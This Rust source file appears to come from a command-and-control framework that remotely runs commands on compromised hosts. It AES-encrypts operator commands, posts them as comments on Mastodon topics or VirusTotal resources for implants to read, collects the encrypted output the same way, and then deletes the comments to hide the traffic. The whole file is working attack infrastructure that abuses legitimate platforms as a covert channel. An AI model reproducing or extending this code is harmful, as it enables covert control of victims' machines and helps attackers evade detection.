use log::{debug,trace,error};
use std::process::exit;
use colored::*;

use crate::args::{Options,Social};
use crate::c2::sessions::Session;
use crate::c2::shell::EXIT_FAILURE;
use crate::modules::{rec2mastodon,rec2virustotal};
use crate::utils::crypto;
use crate::utils::common::{random_string, display_vecu8};

pub enum Status {
    Pending,
    Finished,
}

/// Structure for one job like execute command 
pub struct Job {
    session: Session, // Session 
    id: u32, // job id
    hash: String, // job name YYYYYY
    cmd: String, // cmd
    resp: String, // response output
    status: Status, // got response ?
}

/// Function to execute command on the social network 
/// Waitting output or press enter to put the job in the background and get output with get_output_command()
pub async fn exec_command(
    default_args: &Options,
    id: u32,
    cmd: &str,
    sessions: &mut Vec<Session>,
    jobs: &mut Vec<Job>,
 ) {
    // search session XXXXXX from id 0X in ids
    // prepare command line aes encoded and post it
    // QXXXXXX:YYYYYY -> cmd encoded aes
    // add QXXXXX:YYYYYY -> HashMap or in Struct
    match &default_args.social {
        Social::Mastodon => {
            if id as usize <= sessions.len() && sessions.len() > 0 {
                debug!("Execute command from Mastodon social network..");
                let (url, _username, topic) = rec2mastodon::parse_mastodon_url(&default_args.url);
                let encoded_cmd = hex::encode(crypto::aes_encrypt(&cmd.as_bytes().to_vec()[..], &default_args.key.as_bytes()));
                trace!("Encoded command job: {:?}",&encoded_cmd);
                // Save new job
                let job = Job {
                    session: sessions[id as usize - 1].to_owned(), // Session 
                    id: (jobs.len() as u32 + 1), // job id
                    hash: random_string(6), // job name YYYYYY
                    cmd: cmd.to_string(), // cmd
                    resp: "Please wait..".to_string(), // response output
                    status: Status::Pending, // got response ?
                };
                rec2mastodon::mastodon_post_topic_comment(
                    &url,
                    default_args.token.to_owned(),
                    Some(topic.to_owned()),
                    encoded_cmd,
                    format!("QUES:{}:{}:",&sessions[id as usize -1].hash,&job.hash),
                ).await;
                jobs.push(job);
                display_jobs(jobs);
            }
            else {
                println!("No session for this id..");
            }

        }
        Social::VirusTotal => {
            if id as usize <= sessions.len() && sessions.len() > 0 {
                debug!("Execute command from VirusTotal..");
                let (_url,vtype, resource_id) = rec2virustotal::parse_virustotal_url(&default_args.url);
                let encoded_cmd = hex::encode(crypto::aes_encrypt(&cmd.as_bytes().to_vec()[..], &default_args.key.as_bytes()));
                trace!("Encoded command job: {:?}",&encoded_cmd);
                // Save new job
                let job = Job {
                    session: sessions[id as usize - 1].to_owned(), // Session 
                    id: (jobs.len() as u32 + 1), // job id
                        hash: random_string(6), // job name YYYYYY
                        cmd: cmd.to_string(), // cmd
                        resp: "Please wait..".to_string(), // response output
                        status: Status::Pending, // got response ?
                };
                let datas = format!("QUES:{}:{}:\n{}",&sessions[id as usize -1].hash,&job.hash,encoded_cmd);
                rec2virustotal::virustotal_post_comment(
                    &default_args.token,
                    &resource_id,
                    &vtype,
                    &datas,
                ).await;
                jobs.push(job);
                display_jobs(jobs);
            }
            else {
                println!("No session for this id..");
            }
        }
        Social::Unknown => { 
            error!("Error to execute command '{}' for Social::{:?}",&cmd,&default_args.social);
            exit(EXIT_FAILURE);
        }
    }
}

/// Function to get output command result on the social network 
/// <not beautifful to read...>
pub async fn get_output_command(
    default_args: &Options,
    id: u32,
    jobs: &mut Vec<Job>,
) {
    // search in all comment for session ids XXXXXX
    // and for job YYYYYY the result decode it and print it
    match &default_args.social {
        Social::Mastodon => {
            // TODO patch need to use Status::Pending
            if jobs.len() > 0 {
                if jobs[id as usize - 1].resp.contains("Please wait..") {
                    debug!("Getting output for job ID:{} in Mastodon social network..",id);
                    let (url, _username, topic) = rec2mastodon::parse_mastodon_url(&default_args.url);
                    let (_result_spoiler,_result_content,_in_reply_to_id,_post_id) = rec2mastodon::mastodon_get_topic_comments(
                        &url,
                        default_args.token.to_string(),
                        topic.to_owned(),
                        format!("RESP:{}:{}:",&jobs[id as usize - 1].session.hash,&jobs[id as usize - 1].hash).to_string(),
                    ).await;
                    if _result_content.len() > 0 {
                        jobs[id as usize - 1].status = Status::Finished;
                        jobs[id as usize - 1].resp = display_vecu8(&crypto::aes_decrypt(&hex::decode(&_result_content[0].to_owned().to_string()).unwrap()[..], &default_args.key.as_bytes()));
                    }
                    else {
                        let (_result_spoiler,result_content2,_in_reply_to_id,_post_id) = rec2mastodon::mastodon_get_topic_comments(
                            &url,
                            default_args.token.to_string(),
                            topic.to_owned(),
                            format!("PART:{}:{}:",&jobs[id as usize - 1].session.hash,&jobs[id as usize - 1].hash).to_string(),
                        ).await;
                        if result_content2.len() > 0 {
                            let mut hexa_datas = "".to_owned();
                            for part in result_content2 {
                                hexa_datas = hexa_datas + &part;
                            }
                            jobs[id as usize - 1].status = Status::Finished;
                            jobs[id as usize - 1].resp = display_vecu8(&crypto::aes_decrypt(&hex::decode(&hexa_datas.to_owned().to_string()).unwrap()[..], &default_args.key.as_bytes()));
                        }
                    }
                    // Print result
                    println!("{}",&jobs[id as usize - 1].resp);
    
                    // Delete comments if get output
                    if !jobs[id as usize - 1].resp.contains("Please wait..") {
                        let (url, _username, topic) = rec2mastodon::parse_mastodon_url(&default_args.url);
                        let (_result_spoiler,_result_content,_in_reply_to_id,post_id) = rec2mastodon::mastodon_get_topic_comments(
                            &url,
                            default_args.token.to_string(),
                            topic.to_owned(),
                            format!(":{}:{}",&jobs[id as usize - 1].session.hash,&jobs[id as usize - 1].hash).to_string(),
                        ).await;
                        for id in post_id {
                            rec2mastodon::remove_mastodon_comment(
                                &url,
                                default_args.token.to_string(),
                                id.to_owned(),
                            ).await;
                            debug!("Comment ID:{} deleted!",id);
                        }
                    }
                }
                else {
                    println!("{}",&jobs[id as usize - 1].resp);
                }
            } 
            else {
                println!("No jobs..");
            }
        }
        Social::VirusTotal => {
            // TODO patch need to use Status::Pending
            if jobs.len() > 0 {
                if jobs[id as usize - 1].resp.contains("Please wait..") {
                    debug!("Getting output for job ID:{} in VirusTotal..",id);
                    let (_url,vtype, resource_id) = rec2virustotal::parse_virustotal_url(&default_args.url);
                    let (_result_spoiler,result_content,_post_id) = rec2virustotal::virustotal_get_comments(
                        &default_args.token,
                        &resource_id,
                        &vtype,
                        format!("RESP:{}:{}:",&jobs[id as usize - 1].session.hash,&jobs[id as usize - 1].hash).to_string(),
                    ).await;
                    if result_content.len() > 0 {
                        jobs[id as usize - 1].status = Status::Finished;
                        jobs[id as usize - 1].resp = display_vecu8(&crypto::aes_decrypt(&hex::decode(&result_content[0].to_owned().to_string()).unwrap()[..], &default_args.key.as_bytes()));
                    }
                    else {
                        let (_result_spoiler,result_content2,_post_id) = rec2virustotal::virustotal_get_comments(
                            &default_args.token,
                            &resource_id,
                            &vtype,
                            format!("PART:{}:{}:",&jobs[id as usize - 1].session.hash,&jobs[id as usize - 1].hash).to_string(),
                        ).await;
                        if result_content2.len() > 0 {
                            let mut hexa_datas = "".to_owned();
                            for part in result_content2 {
                                hexa_datas = hexa_datas + &part;
                            }
                            jobs[id as usize - 1].status = Status::Finished;
                            jobs[id as usize - 1].resp = display_vecu8(&crypto::aes_decrypt(&hex::decode(&hexa_datas.to_owned().to_string()).unwrap()[..], &default_args.key.as_bytes()));
                        }
                    }
                    // Delete comments if get output
                    if !jobs[id as usize - 1].resp.contains("Please wait..") {
                        let (_result_spoiler,_result_content,post_id) = rec2virustotal::virustotal_get_comments(
                            &default_args.token,
                            &resource_id,
                            &vtype,
                            format!(":{}:{}",&jobs[id as usize - 1].session.hash,&jobs[id as usize - 1].hash).to_string(),
                        ).await;
                        for id in post_id {
                            rec2virustotal::virustotal_delete_topic_comment(
                                &default_args.token,
                                &id,
                            ).await;
                            debug!("Comment ID:{} deleted!",id);
                        }
                    }
                    // Print result
                    println!("{}",&jobs[id as usize - 1].resp);
                }
                else {
                    println!("{}",&jobs[id as usize - 1].resp);
                }
            } 
            else {
                println!("No jobs..");
            }
        }
        Social::Unknown => { 
            error!("Error to get output for job ID:{} in Social::{:?}",id,&default_args.social);
            exit(EXIT_FAILURE);
        }
    }
}

/// Function to display pending jobs
pub fn display_jobs(
    jobs: &mut Vec<Job>,
) {
    // search in all comment for session ids XXXXXX
    // and for job YYYYYY the result decode it and print it
    debug!("Getting jobs status..");
    if jobs.len() != 0 {
        for job in jobs {
            match job.status {
                Status::Pending => {
                    println!("{:<4}{}","",
                        format!("JOB_ID:{:<5}  SESSION_ID:{:<5}  TARGET:{:<18}  USER:{:<10}  CMD:{:<10}  STATUS:{:15}",
                            job.id.to_string().green().bold(),
                            job.session.id.to_string().green().bold(),
                            job.session.hostname.green().bold(),
                            job.session.user.green().bold(),
                            job.cmd.bold(),
                            "Pending".to_string().truecolor(255,172,89).bold(),
                        )
                    );
                }
                Status::Finished => {
                    println!("{:<4}{}","",
                        format!("JOB_ID:{:<5}  SESSION_ID:{:<5}  TARGET:{:<18}  USER:{:<10}  CMD:{:<10}  STATUS:{:15}",
                            job.id.to_string().green().bold(),
                            job.session.id.to_string().green().bold(),
                            job.session.hostname.green().bold(),
                            job.session.user.green().bold(),
                            job.cmd.bold(),
                            "Finished".to_string().green().bold(),
                        )
                    );
                }
            }
        }
    } else {
        println!("No jobs...");
    }
}